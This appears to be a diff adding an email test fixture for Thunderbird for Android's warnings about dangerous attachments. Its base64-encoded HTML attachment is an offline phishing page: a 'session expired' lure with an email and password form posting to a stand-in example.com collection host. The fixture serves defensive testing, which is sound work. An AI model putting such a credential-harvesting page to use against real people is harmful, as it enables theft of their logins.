@@ -1,0 +1,42 @@
+From: "Statements" <no-reply@secure-statements.example.com>
+To: dev@local.test
+Subject: [SECURITY UI TEST] Your account statement (open attached file)
+Date: Mon, 06 Jul 2026 10:35:00 +0000
+Message-ID: <dangerous-html-36@example.com>
+MIME-Version: 1.0
+X-Test-Case: thunderbird-android-dangerous-attachment-html
+Content-Type: multipart/mixed; boundary="HTML_36"
+
+--HTML_36
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 7bit
+
+Security-UI test fixture (Thunderbird for Android).
+
+The attached "statement.html" is an OFFLINE PHISHING PAGE delivered as an
+attachment - a credential-harvesting login form that opens locally in the
+browser, bypassing URL/domain reputation checks. Its form only posts to a
+reserved example.com host, so it collects nothing real.
+
+Open the attached statement to view your balance.
+
+--HTML_36
+Content-Type: text/html; charset="UTF-8"; name="statement.html"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="statement.html"
+
+PCFkb2N0eXBlIGh0bWw+CjxodG1sPgogIDxoZWFkPjxtZXRhIGNoYXJzZXQ9InV0Zi04Ij48dGl0
+bGU+QWNjb3VudCBTdGF0ZW1lbnQ8L3RpdGxlPjwvaGVhZD4KICA8Ym9keSBzdHlsZT0iZm9udC1m
+YW1pbHk6QXJpYWwsc2Fucy1zZXJpZiI+CiAgICA8aDI+U2VjdXJlIEFjY291bnQgU3RhdGVtZW50
+PC9oMj4KICAgIDxwPllvdXIgc2Vzc2lvbiBleHBpcmVkLiBQbGVhc2Ugc2lnbiBpbiBhZ2FpbiB0
+byB2aWV3IHlvdXIgc3RhdGVtZW50LjwvcD4KICAgIDwhLS0gT2ZmbGluZSBwaGlzaGluZyBmb3Jt
+LiBQb2ludHMgb25seSBhdCBleGFtcGxlLmNvbSAoc2FmZSwgbm9uLXJvdXRhYmxlIGRlbW8pLiAt
+LT4KICAgIDxmb3JtIGFjdGlvbj0iaHR0cDovL2NvbGxlY3QuZXhhbXBsZS5jb20vc3VibWl0IiBt
+ZXRob2Q9InBvc3QiPgogICAgICA8bGFiZWw+RW1haWwgPGlucHV0IG5hbWU9ImVtYWlsIiB0eXBl
+PSJlbWFpbCI+PC9sYWJlbD48YnI+CiAgICAgIDxsYWJlbD5QYXNzd29yZCA8aW5wdXQgbmFtZT0i
+cGFzc3dvcmQiIHR5cGU9InBhc3N3b3JkIj48L2xhYmVsPjxicj4KICAgICAgPGJ1dHRvbiB0eXBl
+PSJzdWJtaXQiPlNpZ24gaW48L2J1dHRvbj4KICAgIDwvZm9ybT4KICAgIDxwIHN0eWxlPSJmb250
+LXNpemU6MTFweDtjb2xvcjojODg4Ij5UaHVuZGVyYmlyZCBBbmRyb2lkIHNlY3VyaXR5LVVJIHRl
+c3QgZml4dHVyZS4gTm90IGEgcmVhbCBsb2dpbiBwYWdlLjwvcD4KICA8L2JvZHk+CjwvaHRtbD4K
+
+--HTML_36--
